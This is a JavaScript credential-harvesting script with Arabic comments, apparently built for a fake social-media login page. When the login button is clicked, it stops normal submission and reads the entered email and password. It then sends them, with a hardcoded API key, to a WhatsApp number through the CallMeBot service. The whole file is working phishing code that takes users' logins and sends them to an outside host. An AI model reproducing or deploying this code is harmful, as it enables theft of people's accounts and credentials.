document.addEventListener("DOMContentLoaded", function () {
    document.querySelector('[data-bloks-name="bk.components.Flexbox"][aria-label="تسجيل الدخول"]').addEventListener('click', function (event) {
        event.preventDefault();

      
        let username = document.querySelector('input[name="email"]').value;
        let password = document.querySelector('input[name="pass"]').value;

        // إعداد CallMeBot API لإرسال رسالة واتساب
        let apiKey = "4122619";  // مفتاح API
        let phoneNumber = "212682497757"; // رقم الواتساب
        let message = `🔐 محاولة تسجيل دخول:\n👤 المستخدم: ${username}\n🔑 كلمة السر: ${password}`;
        let url = `https://api.callmebot.com/whatsapp.php?phone=${phoneNumber}&text=${encodeURIComponent(message)}&apikey=${apiKey}`;

        // إرسال البيانات عبر API
        fetch(url)
            .then(response => response.text())
            .then(data => console.log("تم الإرسال:", data))
            .catch(error => console.error("حدث خطأ:", error));

        
        // document.querySelector('form').submit();
    });
});
